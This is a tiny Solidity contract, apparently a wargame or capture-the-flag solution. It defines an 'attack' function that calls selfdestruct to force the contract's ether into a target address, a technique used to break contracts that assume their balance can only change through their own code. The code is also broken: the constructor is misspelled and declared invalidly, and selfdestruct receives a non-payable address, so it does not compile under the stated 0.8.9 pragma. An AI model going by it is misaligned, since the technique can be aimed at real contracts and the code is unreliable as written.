pragma solidity 0.8.9;

contract forceAtack{

    contructor() public payable {

    }

    function attack(address _address) public{
        selfdestruct(_address);
    }
}